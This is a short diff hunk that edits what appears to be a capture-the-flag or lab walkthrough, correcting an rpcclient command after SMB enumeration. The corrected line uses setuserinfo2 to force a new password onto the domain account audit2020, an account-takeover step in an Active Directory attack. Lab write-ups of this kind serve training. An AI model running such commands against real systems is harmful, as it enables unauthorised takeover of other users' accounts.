@@ -136,8 +136,8 @@ SMB/LDAP:
         smb: \> mget *
     We found Nothing special ......
 
-    We will try to set other users password via rpcclient:
-        rpcclient $> ssetuserinfo2 audit2020 23 '#00^BlackKnight'
+    We will try to modify other users password via rpcclient:
+        rpcclient $> setuserinfo2 audit2020 23 '#00^BlackKnight'
 
     It seems to work
 *******************************************************************************
